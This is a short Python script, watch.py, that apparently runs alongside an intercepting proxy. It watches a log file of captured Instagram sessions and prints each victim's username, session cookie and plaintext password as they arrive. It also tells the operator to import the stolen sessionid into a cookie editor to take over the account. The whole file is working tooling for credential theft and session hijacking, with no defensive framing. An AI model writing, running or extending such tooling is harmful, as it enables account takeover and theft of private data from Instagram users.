#!/usr/bin/env python3
"""
watch.py - Real-time Instagram session monitor
Run this in a separate terminal while the proxy is running.
"""

import json
import os
import time
from datetime import datetime

LOG_FILE = "captured_sessions.json"

def watch():
    print("Instagram Session Monitor")
    print("=" * 40)
    print("Waiting for session captures...\n")

    last_count = 0

    while True:
        try:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r") as f:
                    data = json.load(f)

                session_ids = data.get("session_ids", [])
                if len(session_ids) > last_count:
                    for s in session_ids[last_count:]:
                        print(f"\n{'!'*50}")
                        print(f"!! NEW SESSION CAPTURED!")
                        print(f"!! Time:     {s.get('timestamp', '')}")
                        print(f"!! User:     {s.get('username', 'Unknown')}")
                        print(f"!! sessionid: {s.get('sessionid', '')}")
                        print(f"{'!'*50}")
                        print(f"\nImport this sessionid into Cookie-Editor on instagram.com\n")
                    last_count = len(session_ids)

                credentials = data.get("credentials", [])
                for cred in credentials:
                    if cred.get("_notified") is None:
                        print(f"\n[!] Credentials: {cred.get('username','')}:{cred.get('password','')}")
                        cred["_notified"] = True

            time.sleep(1)
        except KeyboardInterrupt:
            print("\nMonitor stopped.")
            break
        except Exception as e:
            time.sleep(2)

if __name__ == "__main__":
    watch()
